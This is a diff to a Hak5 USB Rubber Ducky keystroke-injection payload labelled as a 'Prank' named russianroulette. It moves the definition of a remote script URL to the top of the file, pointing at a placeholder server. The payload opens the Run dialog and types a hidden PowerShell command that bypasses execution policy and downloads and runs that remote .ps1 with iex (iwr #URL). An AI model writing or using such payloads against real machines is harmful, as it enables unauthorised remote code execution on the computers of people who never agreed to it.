@@ -6,7 +6,8 @@ REM Version: 1.1
 REM Category: Prank
 REM Source: https://github.com/Phishing-Tides/Hak5_RubberDucky_Payloads
 
-REM Requirements: 
+REM Please replace the link with your .ps1 raw file below
+DEFINE #URL https://serveryouown.com/rawfile/russianroulette.ps1
 
 ATTACKMODE HID
 
@@ -58,7 +59,5 @@ DELAY 500
 GUI r
 DELAY 500
 DELETE
-
-DEFINE #URL example.com/ps1  REM Replace this with script URL
 DELAY 100
 STRINGLN powershell -w h -NoP -NonI -Exec Bypass -Command "Start-Process powershell -ArgumentList '-NoP -NonI -Exec Bypass -w h -Command iex (iwr #URL)' -WindowStyle Hidden"
